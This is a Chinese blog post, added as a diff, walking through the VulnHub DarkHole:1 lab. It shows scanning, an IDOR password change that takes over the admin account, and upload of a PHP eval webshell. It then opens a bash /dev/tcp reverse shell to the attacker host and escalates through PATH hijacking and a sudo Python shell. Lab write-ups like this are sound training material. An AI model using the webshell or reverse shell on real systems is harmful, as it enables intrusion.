@@ -1,0 +1,349 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="关键技术：主机发现、目标信息扫描、网站目录扫描、网站逻辑漏洞、文件上传漏洞、蚁剑、反弹 shell、Linux 权限，环境变量相关知识、提权、python 获取 shell。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《VulnHub》DarkHole：1">
+<meta property="og:url" content="https://blog.lens-shrine.top/2023/09/11/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/index.html">
+<meta property="og:site_name" content="镜坛">
+<meta property="og:description" content="关键技术：主机发现、目标信息扫描、网站目录扫描、网站逻辑漏洞、文件上传漏洞、蚁剑、反弹 shell、Linux 权限，环境变量相关知识、提权、python 获取 shell。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/cf1d030254cd442394d2bfc973b03962.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/f347cb37882240f89618f1dc8dcf5c0e.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/23253255e8094764a1e118432fc508ad.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/d9c56e19c9b348e28f78d4ac8659707e.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/91deef0f404b43809d931708ed618b62.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/94a1efb3b06242d3b179144ac44486f6.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/9f80790b827b489e9249529a434b77c5.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/f8d09e12a15144b6a66bada03beed200.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/6d4736140b474abb81835b83ead768f6.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/76ae5b65051642f8b087c9edfec69589.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/e4d005eb78c54cea927da0510cc6a17f.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/2eeabc2fab1948fda42a574b95cf6ed2.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/25aee5302eda40b7bf7b117cd6fbf088.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/aa7aca5994c945ccaed5b32a5a4347dd.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/6681841288b14383aadb05788a75e546.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/6a12ec531a764720b4fe1d4404edd298.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/b8754765a31144b1a087f77648c6031b.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/011d0ae196bc4264bd55da79d86fe37e.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/be7edd28fb44407ba0f9265636791297.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/21af2d1251a947fb9f2bf0cdce2f0104.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/b97bc5d290bd43a59c4ee47ffb3f930b.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/b159d71229b2471196eade49b616731e.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/64887655ae034135b12c126dc2864dee.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/9b63219309e546bbbaa6bb5323c7aa48.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/9762b093c89047a2ae4f040880c7ba81.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/4a938a4700b14bee957d8a54c23b60ca.png">
+<meta property="article:published_time" content="2023-09-11T11:44:42.000Z">
+<meta property="article:modified_time" content="2023-09-11T11:44:43.000Z">
+<meta property="article:author" content="镜坛主">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/cf1d030254cd442394d2bfc973b03962.png"><title>《VulnHub》DarkHole：1 | 镜坛</title><link ref="canonical" href="https://blog.lens-shrine.top/2023/09/11/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":true},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbtack"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner" style="background: url(/images/backimg/SunsetClimbing.png) no-repeat center/cover;"><div class="header-banner-info"><div class="header-banner-info__title">镜 坛</div><div class="header-banner-info__subtitle">烛明香暗画楼深，满鬓青霜残雪思难任。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">《VulnHub》DarkHole：1</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-11</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><p>@<a href="VulnHub">TOC</a></p>
+<hr>
+<blockquote>
+<p>VulnHub 打靶记录。<br>VulnHub 官网：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/" >https://www.vulnhub.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<blockquote>
+<p>攻击机为 Kali-Linux-2023.2-vmware-amd64。<br>Kali NAT IP：192.168.8.10。</p>
+</blockquote>
+
+        <h1 id="1：靶场信息"   >
+          <a href="#1：靶场信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#1：靶场信息" class="headerlink" title="1：靶场信息"></a>1：靶场信息</h1>
+      <p>靶场网址：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/darkhole-1,724/" >https://www.vulnhub.com/entry/darkhole-1,724/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="2：打靶"   >
+          <a href="#2：打靶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2：打靶" class="headerlink" title="2：打靶"></a>2：打靶</h1>
+      
+        <h2 id="2-1：情报收集-威胁建模"   >
+          <a href="#2-1：情报收集-威胁建模" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1：情报收集-威胁建模" class="headerlink" title="2.1：情报收集 &amp; 威胁建模"></a>2.1：情报收集 &amp; 威胁建模</h2>
+      <p>首先确定目标 ip：</p>
+<p><strong>主机发现</strong>：<br><code>nmap -sn 192.168.8.0/24</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/cf1d030254cd442394d2bfc973b03962.png" alt="在这里插入图片描述"></p>
+<p>目标 ip 为 192.168.8.108。</p>
+<p>接着扫描一下目标端口信息：</p>
+<p><strong>目标信息扫描</strong>：<br><code>nmap -sS -sV -T4 -n -p- 192.168.8.108</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/f347cb37882240f89618f1dc8dcf5c0e.png" alt="在这里插入图片描述"></p>
+<p>目标开放了 80 端口和 22 端口。</p>
+<p>访问 80 端口，有一个登录页面，还有注册页面。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/23253255e8094764a1e118432fc508ad.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/d9c56e19c9b348e28f78d4ac8659707e.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/91deef0f404b43809d931708ed618b62.png" alt="在这里插入图片描述"></p>
+<p>除此以外再扫描一下网站目录。</p>
+<p><strong>扫描网站目录</strong>：<br><code>dirsearch -u http://192.168.8.108/</code></p>
+<p>经过检查没有太多有用的信息，（但 &#x2F;upload&#x2F; 目录下有彩蛋。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/94a1efb3b06242d3b179144ac44486f6.png" alt="在这里插入图片描述"></p>
+
+        <h2 id="2-2：漏洞分析-渗透攻击"   >
+          <a href="#2-2：漏洞分析-渗透攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-2：漏洞分析-渗透攻击" class="headerlink" title="2.2：漏洞分析 &amp; 渗透攻击"></a>2.2：漏洞分析 &amp; 渗透攻击</h2>
+      <p>80 端口的 web 初步检查没有弱点，只能先注册一个账号登录进去看看。</p>
+<p>登录后的页面，有一个更新用户信息和修改密码的选项。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/9f80790b827b489e9249529a434b77c5.png" alt="在这里插入图片描述"></p>
+<p>尝试修改 url 的 ID 参数，无果。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/f8d09e12a15144b6a66bada03beed200.png" alt="在这里插入图片描述"></p>
+<p>没办法。抓包看一下修改密码的数据包。</p>
+<p>可以看到修改密码时附带了用户 ID。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/6d4736140b474abb81835b83ead768f6.png" alt="在这里插入图片描述"></p>
+<p>那就尝试一下能不能通过修改提交的 ID 越权修改其他用户的密码。<br>尝试修改 ID 为 1 的用户，应该就是 admin。修改成功。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/76ae5b65051642f8b087c9edfec69589.png" alt="在这里插入图片描述"></p>
+<p>登录到 admin 之后发现可以上传文件。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/e4d005eb78c54cea927da0510cc6a17f.png" alt="在这里插入图片描述"></p>
+<p>在各种尝试之后，发现后端检测应该是黑名单机制。成功上传 .phtml 文件。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/2eeabc2fab1948fda42a574b95cf6ed2.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Hello!&#x27;</span>;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>上传成功后给出了文件地址，访问发现文件可以被执行。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/25aee5302eda40b7bf7b117cd6fbf088.png" alt="在这里插入图片描述"></p>
+<p>使用蚁剑连接。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/aa7aca5994c945ccaed5b32a5a4347dd.png" alt="在这里插入图片描述"></p>
+<p>连接成功后首先使用蚁剑终端进行 shell 反弹。</p>
+<p><strong>反弹 shell</strong>：<br>1、kali：<code>nc -lv -p 6666</code><br>2、server：<code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.8.10/6666 &lt;&amp;1&#39;</code></p>
+<p>成功反弹 shell。这里尝试了其他反弹 shell 的代码，有些不知道为什么不能运行，不过换其他语句即可。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/6681841288b14383aadb05788a75e546.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>这里说一下为什么要第一时间反弹 shell，因为在其他终端（网页、蚁剑等）可能会有潜在的限制。不便于之后的操作（例如提权）。</p>
+</blockquote>
+
+        <h2 id="2-3：后渗透"   >
+          <a href="#2-3：后渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3：后渗透" class="headerlink" title="2.3：后渗透"></a>2.3：后渗透</h2>
+      <p>可以尝试使用 <code>find</code> 命令查找敏感文件。不过这里直接查看一下 <font style="background:#70AD47">&#x2F;etc&#x2F;passwd</font> 文件，寻找一下存在可以提权的用户。</p>
+<p><code>cat /etc/passwd | grep /bin/bash</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/6a12ec531a764720b4fe1d4404edd298.png" alt="在这里插入图片描述"></p>
+<p>进入到 darkhole 与 john 用户的 home 目录，寻找有用信息。在 john 目录下发现一些有趣的文件。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/b8754765a31144b1a087f77648c6031b.png" alt="在这里插入图片描述"></p>
+<p><font style="background:#70AD47">password</font> 与 <font style="background:#70AD47">user.txt</font> 文件无权查看。<br>运行一下 <font style="background:#70AD47">toto</font> 文件，发现它以 john 用户的身份运行类似 <code>id</code> 的命令。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/011d0ae196bc4264bd55da79d86fe37e.png" alt="在这里插入图片描述"></p>
+<p>那就尝试使用该文件提权。</p>
+<ol>
+<li>在本地编辑新的 <font style="background:#70AD47">id</font> 文件，写入 &#x2F;bin&#x2F;bash，给执行权限。</li>
+<li>然后将文件路径写入到原有环境变量前，这样使用 <code>id</code> 命令时就会优先匹配此路径下的 <font style="background:#70AD47">id</font> 文件运行。</li>
+<li>所以运行 <font style="background:#70AD47">toto</font> 文件使用 john 身份调用 <code>id</code> 命令，实际上就是使用 john 身份调用 <font style="background:#70AD47">id</font> 文件运行，即可获得 john 的 shell。</li>
+</ol>
+<p><strong>创建一个新 id 文件</strong>：<br><code>echo &#39;/bin/bash&#39; &gt; /tmp/id</code></p>
+<p><strong>赋予权限</strong>：<br><code>chmod +x /tmp/id</code></p>
+<p><strong>改变环境变量</strong>：<br><code>export PATH=/tmp:$PATH</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/be7edd28fb44407ba0f9265636791297.png" alt="在这里插入图片描述"></p>
+<p>然后运行 <font style="background:#70AD47">toto</font> 文件即获得 john 权限。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/21af2d1251a947fb9f2bf0cdce2f0104.png" alt="在这里插入图片描述"></p>
+<p>之后查看 <font style="background:#70AD47">&#x2F;home&#x2F;john&#x2F;</font> 下原本无权查看的 <font style="background:#70AD47">password</font> 文件与 <font style="background:#70AD47">user.txt</font> 文件。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/b97bc5d290bd43a59c4ee47ffb3f930b.png" alt="在这里插入图片描述"></p>
+<p>得到一个密码：root123。猜测是 john 用户的相关密码。</p>
+<p>同时目标开启了 22 端口，提供 ssh 服务。尝试使用 john 账户登录。</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/b159d71229b2471196eade49b616731e.png" alt="在这里插入图片描述"></p>
+<p>现在仍然是 john 账户，接下来提权到 root。</p>
+<p><strong>查看用户能够使用 sudo 运行的命令</strong>：<br><code>sudo -l</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/64887655ae034135b12c126dc2864dee.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>运行 <code>sudo -l</code>，用户可以了解自己在系统上具有的 sudo 权限，以及可以运行的特权命令与文件。</p>
+</blockquote>
+<p>可以看到 john 用户可以以管理员身份运行 <font style="background:#70AD47">&#x2F;home&#x2F;john&#x2F;file.py</font>。</p>
+<ul>
+<li>那么只要通过此文件执行获取 shell，即可获得管理员权限。</li>
+</ul>
+<ol>
+<li>将获取 shell 的命令加入到此 python 文件。<br><code>echo &#39;import os;os.system(&quot;/bin/bash&quot;)&#39; &gt; file.py</code></li>
+<li>以管理员身份执行即可。<br><code>sudo python3 /home/john/file.py</code></li>
+</ol>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/9b63219309e546bbbaa6bb5323c7aa48.png" alt="在这里插入图片描述"></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/9762b093c89047a2ae4f040880c7ba81.png" alt="在这里插入图片描述"></p>
+<p>成功获取 root 权限。完结撒花！(◕ᴗ◕✿)</p>
+<p>最后补充一下为什么要通过 ssh 连接以后再提权：如果直接通过反弹的 shell 尝试提权至 root，会出现以下情况：</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/4a938a4700b14bee957d8a54c23b60ca.png" alt="在这里插入图片描述"></p>
+<p>完结 (◕ᴗ◕✿)</p>
+
+        <h1 id="3：总结"   >
+          <a href="#3：总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#3：总结" class="headerlink" title="3：总结"></a>3：总结</h1>
+      
+        <h2 id="3-1：命令-工具"   >
+          <a href="#3-1：命令-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1：命令-工具" class="headerlink" title="3.1：命令 &amp; 工具"></a>3.1：命令 &amp; 工具</h2>
+      <ul>
+<li>Nmap</li>
+<li>dirsearch</li>
+<li>BurpSuite</li>
+<li>蚁剑</li>
+<li>NetCat</li>
+<li>bash</li>
+<li>ssh</li>
+<li>python</li>
+</ul>
+
+        <h3 id="3-1-1：Nmap"   >
+          <a href="#3-1-1：Nmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-1：Nmap" class="headerlink" title="3.1.1：Nmap"></a>3.1.1：Nmap</h3>
+      <p><strong>部分选项</strong>：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-sn</code></td>
+<td align="left"><code>Ping Scan - disable port scan</code></td>
+</tr>
+<tr>
+<td align="left"><code>-sS/sT/sA/sW/sM</code></td>
+<td align="left"><code>TCP SYN/Connect()/ACK/Window/Maimon scans</code></td>
+</tr>
+<tr>
+<td align="left"><code>-sV</code></td>
+<td align="left"><code>Probe open ports to determine service/version info</code></td>
+</tr>
+<tr>
+<td align="left"><code>-T&lt;0-5&gt;</code></td>
+<td align="left"><code>Set timing template (higher is faster)</code></td>
+</tr>
+<tr>
+<td align="left"><code>-n/-R</code></td>
+<td align="left"><code>Never do DNS resolution/Always resolve [default: sometimes]</code></td>
+</tr>
+<tr>
+<td align="left"><code>-p-</code></td>
+<td align="left"><code>描目标主机的所有端口</code></td>
+</tr>
+</tbody></table></div>
+
+        <h2 id="3-2：关键技术"   >
+          <a href="#3-2：关键技术" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-2：关键技术" class="headerlink" title="3.2：关键技术"></a>3.2：关键技术</h2>
+      <ul>
+<li><p><strong>主机发现</strong>：<br><code>nmap -sn &lt;IP&gt;</code></p>
+</li>
+<li><p><strong>目标信息扫描</strong>，扫描所有端口及开放端口的服务：<br><code>nmap -sS -sV -T&lt;0-5&gt; -n -p- &lt;target&gt;</code></p>
+</li>
+<li><p><strong>网站目录扫描</strong>：<br><code>dirsearch -u &lt;URL&gt;</code></p>
+</li>
+<li><p><strong>网站逻辑漏洞</strong>，越权之修改密码。</p>
+</li>
+<li><p><strong>文件上传漏洞</strong>。</p>
+</li>
+<li><p><strong>蚁剑连接一句话木马</strong>。</p>
+</li>
+<li><p><strong>反弹 shell</strong>：<br>1、kali：<code>nc -lv -p &lt;端口&gt;</code><br>2、server：<code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/&lt;IP&gt;/&lt;端口&gt; &lt;&amp;1&#39;</code></p>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><code>bash -c</code>：让系统运行一个新的 Bash shell，<code>-c</code> 选项后是实际要执行的命令。</li>
+<li><code>exec</code>：替换当前 shell 进程。这意味着之前的 shell 进程将被关闭，而新的 Bash shell 将接管标准输入、标准输出和标准错误流。</li>
+<li><code>bash -i</code>：启动一个交互式 Bash shell，<code>-i</code> 表示这是一个交互式的 shell，可以接受用户输入。</li>
+<li><code>&amp;&gt;</code>：重定向操作符，将后续的命令的标准输出和标准错误都重定向到一个文件或设备。在这里即 <code>/dev/tcp/&lt;IP&gt;/&lt;端口&gt;</code>，将标准输出和标准错误都重定向到一个指定的 IP 地址和端口。</li>
+<li><code>&lt;&amp;1</code>：将标准输入重定向到标准输出。确保在建立连接后，用户可以在远程 shell 中输入命令。</li>
+</ul>
+</blockquote>
+<ul>
+<li><p><strong>Linux 权限、环境变量相关知识</strong>。</p>
+</li>
+<li><p><strong>查看用户具有的 sudo 权限</strong>：<br><code>sudo -l</code></p>
+</li>
+<li><p><strong>提权</strong>，通过系统调用实现。</p>
+</li>
+<li><p><strong>python 获取 shell</strong>。</p>
+</li>
+</ul>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os;</span><br><span class="line">os.system(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></div></figure>
+
+
+<hr>
+<p><font color="#FF6A6A">
+若待功成拂衣去，武陵桃花笑杀人。
+</font></p>
+<p align="right"><font color="#FF6A6A">
+——《当涂赵炎少府粉图山水歌》（唐）李白
+</font></p>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://blog.lens-shrine.top">镜坛主</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://blog.lens-shrine.top/2023/09/11/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/">https://blog.lens-shrine.top/2023/09/11/WriteUp%EF%BC%9ACyber-Range/VulnHub/DarkHole%EF%BC%9A1/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/10/02/WriteUp%EF%BC%9ASecurity-Lab/XSS-Labs/01.%20Level%201~10/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">《XSS-Labs》01. Level 1~10</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/09/04/WriteUp%EF%BC%9ACyber-Range/VulnHub/Empire%EF%BC%9ABreakout/"><span class="paginator-prev__text">《VulnHub》Empire：Breakout</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%EF%BC%9A%E9%9D%B6%E5%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-text">
+          1：靶场信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%EF%BC%9A%E6%89%93%E9%9D%B6"><span class="toc-text">
+          2：打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86-%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1"><span class="toc-text">
